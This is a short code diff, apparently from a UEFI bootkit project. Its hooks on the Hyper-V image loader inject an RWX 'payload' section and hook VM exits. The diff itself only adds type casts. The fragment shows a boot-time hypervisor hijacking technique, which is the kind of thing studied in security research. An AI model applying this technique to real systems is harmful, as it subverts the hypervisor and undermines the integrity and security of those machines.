@@ -63,12 +63,12 @@ EFI_STATUS EFIAPI HvBlImgLoadPEImageFromSourceBuffer
 		MakeSputnikData
 		(
 			&SputnikData,
-			*ImageBase,
+			(VOID*)*ImageBase,
 			*ImageSize,
 			AddSection
 			(
-				*ImageBase,
-				"payload",
+				(VOID*)*ImageBase,
+				(CHAR8*)"payload",
 				PayLoadSize(),
 				SECTION_RWX
 			),
@@ -77,8 +77,8 @@ EFI_STATUS EFIAPI HvBlImgLoadPEImageFromSourceBuffer
 
 		HookVmExit
 		(
-			SputnikData.HypervModuleBase,
-			SputnikData.HypervModuleSize,
+			(VOID*)SputnikData.HypervModuleBase,
+			(VOID*)SputnikData.HypervModuleSize,
 			MapModule(&SputnikData, PayLoad)
 		);
 
@@ -113,7 +113,7 @@ EFI_STATUS EFIAPI HvBlImgLoadPEImageEx
 		DeviceId,
 		MemoryType, 
 		Path, 
-		ImageBase, 
+		(VOID**)ImageBase,
 		ImageSize, 
 		Hash, 
 		Flags,
@@ -139,12 +139,12 @@ EFI_STATUS EFIAPI HvBlImgLoadPEImageEx
 		MakeSputnikData
 		(
 			&SputnikData,
-			*ImageBase,
+			(VOID*)*ImageBase,
 			*ImageSize,
 			AddSection
 			(
-				*ImageBase,
-				"payload",
+				(VOID*)*ImageBase,
+				(CHAR8*)"payload",
 				PayLoadSize(),
 				SECTION_RWX
 			),
@@ -153,8 +153,8 @@ EFI_STATUS EFIAPI HvBlImgLoadPEImageEx
 
 		HookVmExit
 		(
-			SputnikData.HypervModuleBase,
-			SputnikData.HypervModuleSize,
+			(VOID*)SputnikData.HypervModuleBase,
+			(VOID*)SputnikData.HypervModuleSize,
 			MapModule(&SputnikData, PayLoad)
 		);
 
